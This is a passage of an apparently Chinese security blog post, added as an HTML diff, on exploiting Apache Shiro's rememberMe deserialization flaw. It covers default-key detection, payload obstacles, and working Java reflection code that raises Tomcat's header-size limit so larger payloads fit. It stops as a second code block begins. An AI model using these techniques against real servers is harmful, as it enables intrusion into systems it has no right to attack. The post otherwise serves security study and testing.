@@ -1,0 +1,2233 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" />
+
+    <meta name="generator" content="Hugo 0.88.1" /><meta name="theme-color" content="#16171d" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <title>Shiro 回显与内存马实现 | MYZXCG</title>
+
+    <link rel="stylesheet" href="/css/meme.min.ee7d92038178eda958210f69458541e2686ada11055b93762d6d324f2acc47c5.css"/>
+
+    
+    
+        <script src="/js/meme.min.4194bf2034241e3757fbbbf5fe4db43d0ff17c81f4496e6bc931504f0978cbd2.js"></script>
+
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
+        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
+
+    <meta name="author" content="myzxcg" /><meta name="description" content="本文主要对Shiro反序列化利用过程涉及到的问题进行分析。因其触发原理比较简单，对调……" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="MYZXCG" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="MYZXCG" />
+    <meta name="msapplication-starturl" content="../../../" />
+    <meta name="msapplication-TileColor" content="#603cba" />
+    <meta name="msapplication-TileImage" content="../../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+
+    
+    
+
+    
+    <link rel="canonical" href="https://myzxcg.com/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" />
+    
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2021-11-01T00:45:08+08:00",
+        "dateModified": "2021-11-20T15:26:47+08:00",
+        "url": "https://myzxcg.com/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/",
+        "headline": "Shiro 回显与内存马实现",
+        "description": "本文主要对Shiro反序列化利用过程涉及到的问题进行分析。因其触发原理比较简单，对调……",
+        "inLanguage" : "zh-CN",
+        "articleSection": "posts",
+        "wordCount":  7143 ,
+        "image": ["https://myzxcg.com/images/1635670385.png","https://myzxcg.com/images/image-20211031165403.png","https://myzxcg.com/images/image-20211031165430.png","https://myzxcg.com/images/image-20211031165555.png","https://myzxcg.com/images/image-20211031165634.png","https://myzxcg.com/images/image-20211031170807.png","https://myzxcg.com/images/image-20211031170901.png","https://myzxcg.com/images/image-20211031170958.png"],
+        "author": {
+            "@type": "Person",
+            "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
+            "email": "myzx.xcg@gmail.com",
+            "image": "https://myzxcg.com/avatar.png",
+            "url": "https://myzxcg.com/",
+            "name": "myzxcg"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
+        "publisher": {
+            "@type": "Organization",
+            "name": "MYZXCG",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://myzxcg.com/icons/favicon.ico"
+            },
+            "url": "https://myzxcg.com/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://myzxcg.com/"
+        }
+    }
+</script>
+
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+
+
+<meta name="twitter:site" content="@myzxcg" />
+<meta name="twitter:creator" content="@myzxcg" />
+
+    
+
+
+
+<meta property="og:title" content="Shiro 回显与内存马实现" />
+<meta property="og:description" content="本文主要对Shiro反序列化利用过程涉及到的问题进行分析。因其触发原理比较简单，对调……" />
+<meta property="og:url" content="https://myzxcg.com/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" />
+<meta property="og:site_name" content="MYZXCG" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/1635670385.png" />
+<meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2021-11-01T00:45:08&#43;08:00" />
+    <meta property="article:modified_time" content="2021-11-20T15:26:47&#43;08:00" />
+    
+    <meta property="article:section" content="posts" />
+
+
+        <link rel="preconnect" href="https://www.google-analytics.com" crossorigin />
+
+        
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y0LZRMN44V"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-Y0LZRMN44V');
+    </script>
+
+
+
+
+    
+    
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        
+            <div class="header-wrapper">
+                <div class="header-inner single">
+                    
+    <div class="site-brand">
+        
+            <a href="/" class="brand">MYZXCG</a>
+        
+    </div>
+
+                    <nav class="nav">
+    <ul class="menu" id="menu">
+        
+            
+        
+        
+        
+        
+            
+                <li class="menu-item"><a href="/archives/"><span class="menu-item-name">文章</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        
+            
+                
+                    
+                    
+                
+            
+        
+            
+                
+            
+        
+    </ul>
+</nav>
+
+                    
+                </div>
+            </div>
+            
+    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
+    <label for="nav-toggle" class="nav-toggle"></label>
+    <label for="nav-toggle" class="nav-curtain"></label>
+
+
+        
+    </header>
+
+
+
+
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        
+
+        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
+
+            <h1 class="post-title p-name">Shiro 回显与内存马实现</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2021-11-01T00:45:08&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.11.1</time>
+    
+    
+    
+    
+        
+        
+        
+            
+        
+    
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;15&nbsp;分钟</span>
+    
+
+   
+    
+
+    
+    
+</div>
+
+            
+
+            <nav class="contents">
+  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
+    <li><a id="contents:shiro-550" href="#shiro-550">Shiro-550</a></li>
+    <li><a id="contents:shiro-密钥的检测原理" href="#shiro-密钥的检测原理">Shiro 密钥的检测原理</a></li>
+    <li><a id="contents:检测工具" href="#检测工具">检测工具</a></li>
+    <li><a id="contents:利用过程存在的问题" href="#利用过程存在的问题">利用过程存在的问题</a></li>
+    <li><a id="contents:反序列化回显" href="#反序列化回显">反序列化回显</a>
+      <ol>
+        <li><a id="contents:回显实现" href="#回显实现">回显实现</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:反序列化注入内存马" href="#反序列化注入内存马">反序列化注入内存马</a></li>
+    <li><a id="contents:参考" href="#参考">参考</a></li>
+  </ol>
+</nav><div class="post-body e-content">
+                <p>本文主要对Shiro反序列化利用过程涉及到的问题进行分析。因其触发原理比较简单，对调试分析过程就不过多叙述了。</p>
+<h2 id="shiro-550"><a href="#shiro-550" class="anchor-link">#</a><a href="#contents:shiro-550" class="headings">Shiro-550</a></h2>
+<p>1.2.4版本的AES加密的密钥默认硬编码在代码里。而对rememberMe字段的处理是AES解密后直接进行反序列化。所以如果知道AES加密的密钥且目标有可用的gadget，便可进行利用。</p>
+<p><strong>修复方法:</strong> Shiro 1.2.4以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果没有设置则每次启动服务器动态生成。</p>
+<p>在1.4.2版本之前，AES的模式为AES-CBC。在1.4.2版本后，更换加密模式为AES-GCM。</p>
+<h2 id="shiro-密钥的检测原理"><a href="#shiro-密钥的检测原理" class="anchor-link">#</a><a href="#contents:shiro-密钥的检测原理" class="headings">Shiro 密钥的检测原理</a></h2>
+<ol>
+<li>当密钥不正确或类型转换异常时，Response包含<code>Set-Cookie: rememberMe=deleteMe</code>字段。</li>
+<li>当密钥正确且没有类型转换异常时，返回包不存在<code>Set-Cookie: rememberMe=deleteMe</code>字段。</li>
+</ol>
+<p>当密钥不正确时，在org.apache.shiro.crypto.JcaCipherService#crypt函数抛出异常:</p>
+<p><img src="/images/1635670385.png" alt=""></p>
+<p>当返回类型不正确时，会在返回值类型转换的时候抛出异常，这里是: <code>java.lang.ClassCastException: java.util.HashMap cannot be cast to org.apache.shiro.subject.PrincipalCollection</code></p>
+<p><img src="/images/image-20211031165403.png" alt=""></p>
+<p>这两个抛出的异常都在<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code> 方法中捕获并处理。</p>
+<p><img src="/images/image-20211031165430.png" alt=""></p>
+<p>在catch的onRememberedPrincipalFailure() 方法里调用了<code>org.apache.shiro.web.servlet.impleCookie#removeFrom()</code>方法来对返回包设置<code>rememberMe=deleteMe</code>字段。</p>
+<p><img src="/images/image-20211031165555.png" alt=""></p>
+<p>所以判断密钥的正确与否，需要先让反序列化后的对象能够正常转换为<code>PrincipalCollection</code>对象，如果密钥正确那么返回包里就不会存在<code>Set-Cookie: rememberMe=deleteMe</code>字段。</p>
+<p>可知<code>org.apache.shiro.subject.SimplePrincipalCollection</code>类实现了PrincipalCollection类，在转换时不会抛出异常。所以创建并序列化该对象，用Key aes加密序列化数据填充到rememberMe字段即可。</p>
+<p><img src="/images/image-20211031165634.png" alt=""></p>
+<h2 id="检测工具"><a href="#检测工具" class="anchor-link">#</a><a href="#contents:检测工具" class="headings">检测工具</a></h2>
+<p><a href="https://github.com/myzxcg/ShiroKeyCheck" target="_blank" rel="noopener">GitHub - myzxcg/ShiroKeyCheck: Shiro key check,golang Version</a></p>
+<p>这工具是今年HW后写的，Go语言练手。集成了CBC和GCM两种加密模式的检测，内置了网上泄露的100+密钥。支持自定义生成rememberMe字段、请求间隔、设置HTTP代理等。</p>
+<h2 id="利用过程存在的问题"><a href="#利用过程存在的问题" class="anchor-link">#</a><a href="#contents:利用过程存在的问题" class="headings">利用过程存在的问题</a></h2>
+<ol>
+<li>
+<p><strong>Tomcat下Shiro无法利用<code>Commons-Collections 3.1-3.2.1</code>版本包含Transform数组的利用链。</strong></p>
+<p>因为Shiro重写了ObjectInputStream类的resolveClass函数。ObjectInputStream的<code>resolveClass</code>方法用的是Class.forName类获取当前描述器所指代的类的Class对象。</p>
+<p>Shiro的resovleClass会调用tomcat的<code>org.apache.catalina.loader.WebappClassLoaderBase#loadClass</code>方法加载类，该方法会先寻找缓存（由于该类对数组类序列化path路径的处理问题，会找不到），找不到再调用<code>Class.forName</code>并使用URLClassLoader作为加载器去加载<code>org.apache.commons.collections.Transformer</code>类，但用这个类加载器必然也会找不到该类。</p>
+<p>可参考：<a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/35</a></p>
+<p>解决方法: Commons-Collections 3.1通过TemplatesImpl加载字节码，可见<a href="https://myzxcg.com/2021/10/Ysoserial-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/#Commons-Collections11" target="_blank" rel="noopener">cc11链分析</a>。</p>
+</li>
+<li>
+<p><strong>SUID 不匹配</strong></p>
+<p>如果序列化字节流中的serialVersionUID与目标服务器对应类中的serialVersionUID不同就会出现异常，导致反序列化失败。因为不同版本jar包可能存在不同的计算方式导致算出的SUID不同，只需要和目标一样的jar包版本去生成payload即可解决。</p>
+</li>
+<li>
+<p><strong>中间件请求头长度限制</strong></p>
+<ol>
+<li>
+<p>修改Tomcat请求头最大值（适用于Tomcat 7、8、9）</p>
+<p>通过反射修改<code>org.apache.coyote.http11.AbstractHttp11Protocol</code>的maxHeaderSize的大小（默认长度8192），这个值会影响新的Request的inputBuffer时的对于header的限制。但由于request的inputbuffer会复用，所以在修改完maxHeaderSize之后，需要多个连接同时访问（burp开多线程跑），让tomcat新建request的inputbuffer，这时候的buffer的大小就会使用修改后的值。</p>
+<p><strong>代码实现</strong></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">class</span> <span class="nc">Tomcat789</span> <span class="o">{</span>
+        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getField</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">Field</span> <span class="n">declaredField</span><span class="o">;</span>
+            <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">object</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
+            <span class="k">while</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">try</span> <span class="o">{</span>
+
+                    <span class="n">declaredField</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+                    <span class="n">declaredField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="k">return</span> <span class="n">declaredField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="o">}</span>
+                <span class="n">clazz</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">GetAcceptorThread</span><span class="o">()</span> <span class="o">{</span>
+            <span class="c1">//获取当前所有线程
+</span><span class="c1"></span>            <span class="n">Thread</span><span class="o">[]</span> <span class="n">threads</span> <span class="o">=</span> <span class="o">(</span><span class="n">Thread</span><span class="o">[])</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getThreadGroup</span><span class="o">(),</span> <span class="s">&#34;threads&#34;</span><span class="o">);</span>
+            <span class="c1">//从线程组中找到Acceptor所在的线程 在tomcat6中的格式为:Http-端口-Acceptor
+</span><span class="c1"></span>            <span class="k">for</span> <span class="o">(</span><span class="n">Thread</span> <span class="n">thread</span> <span class="o">:</span> <span class="n">threads</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">thread</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">continue</span><span class="o">;</span>
+                <span class="o">}</span>
+                <span class="k">if</span> <span class="o">((</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Acceptor&#34;</span><span class="o">))</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;http&#34;</span><span class="o">)))</span> <span class="o">{</span>
+                    <span class="n">Object</span> <span class="n">target</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">thread</span><span class="o">,</span> <span class="s">&#34;target&#34;</span><span class="o">);</span>
+                    <span class="k">if</span> <span class="o">(!(</span><span class="n">target</span> <span class="k">instanceof</span> <span class="n">Runnable</span><span class="o">))</span> <span class="o">{</span>
+                        <span class="k">try</span> <span class="o">{</span>
+                            <span class="n">Object</span> <span class="n">target2</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">thread</span><span class="o">,</span> <span class="s">&#34;this$0&#34;</span><span class="o">);</span>
+                            <span class="n">target</span> <span class="o">=</span> <span class="n">thread</span><span class="o">;</span>
+                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                            <span class="k">continue</span><span class="o">;</span>
+                        <span class="o">}</span>
+                    <span class="o">}</span>
+                    <span class="n">Object</span> <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;this$0&#34;</span><span class="o">);</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">jioEndPoint</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">try</span> <span class="o">{</span>
+                            <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;endpoint&#34;</span><span class="o">);</span>
+                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                            <span class="k">continue</span><span class="o">;</span>
+                        <span class="o">}</span>
+                    <span class="o">}</span>
+                    <span class="k">return</span> <span class="n">jioEndPoint</span><span class="o">;</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="kd">public</span> <span class="nf">Tomcat789</span><span class="o">()</span> <span class="o">{</span>
+            <span class="n">Object</span> <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">GetAcceptorThread</span><span class="o">();</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">jioEndPoint</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="n">Object</span> <span class="n">object</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">jioEndPoint</span><span class="o">,</span> <span class="s">&#34;handler&#34;</span><span class="o">),</span> <span class="s">&#34;global&#34;</span><span class="o">);</span>
+            <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span> <span class="n">processors</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">object</span><span class="o">,</span> <span class="s">&#34;processors&#34;</span><span class="o">);</span>
+            <span class="n">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">processors</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
+            <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+                <span class="n">Object</span> <span class="n">next</span> <span class="o">=</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+                <span class="n">Object</span> <span class="n">req</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">next</span><span class="o">,</span> <span class="s">&#34;req&#34;</span><span class="o">);</span>
+                <span class="n">Object</span> <span class="n">serverPort</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="s">&#34;serverPort&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">serverPort</span><span class="o">.</span><span class="na">equals</span><span class="o">(-</span><span class="n">1</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">continue</span><span class="o">;</span>
+                <span class="o">}</span>
+                <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span> <span class="n">request</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">connector</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span> <span class="o">((</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">coyote</span><span class="o">.</span><span class="na">Request</span><span class="o">)</span> <span class="n">req</span><span class="o">).</span><span class="na">getNote</span><span class="o">(</span><span class="n">1</span><span class="o">);</span>
+                <span class="n">ServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">().</span><span class="na">getServletContext</span><span class="o">();</span>
+                <span class="n">Connector</span><span class="o">[]</span> <span class="n">connector</span><span class="o">=(</span><span class="n">Connector</span><span class="o">[])</span><span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">servletContext</span><span class="o">,</span><span class="s">&#34;context&#34;</span><span class="o">),</span><span class="s">&#34;service&#34;</span><span class="o">),</span><span class="s">&#34;connectors&#34;</span><span class="o">);</span>
+                <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">coyote</span><span class="o">.</span><span class="na">ProtocolHandler</span> <span class="n">protocolHandler</span> <span class="o">=</span> <span class="n">connector</span><span class="o">[</span><span class="n">0</span><span class="o">].</span><span class="na">getProtocolHandler</span><span class="o">();</span>
+                <span class="o">((</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">coyote</span><span class="o">.</span><span class="na">http11</span><span class="o">.</span><span class="na">AbstractHttp11Protocol</span><span class="o">)</span> <span class="n">protocolHandler</span><span class="o">).</span><span class="na">setMaxHttpHeaderSize</span><span class="o">(</span><span class="n">10000</span><span class="o">);</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+
+        <span class="o">}</span>
+    <span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>通过获取存储在post请求参数中的字节码，利用Classloader加载。</p>
+<p>代码参考下面将介绍的的Tomcat回显实现。</p>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="反序列化回显"><a href="#反序列化回显" class="anchor-link">#</a><a href="#contents:反序列化回显" class="headings">反序列化回显</a></h2>
+<p>利用JSP注入的时候由于request和response是jsp的内置对象，所以在回显问题上不用考虑。但是当结合反序列化进行注入的时候需要获取到request和response对象才能进行回显。</p>
+<p><strong>获取request和response对象的方法</strong></p>
+<ol>
+<li>
+<p><strong>通用型回显（适用于Tomcat 6、7、8、9）</strong>（参考之前的文章：<a href="https://myzxcg.com/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/#%E8%8E%B7%E5%8F%96StandardContext" target="_blank" rel="noopener">获取StandardContext</a>）。</p>
+<p><strong>代码实现</strong></p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
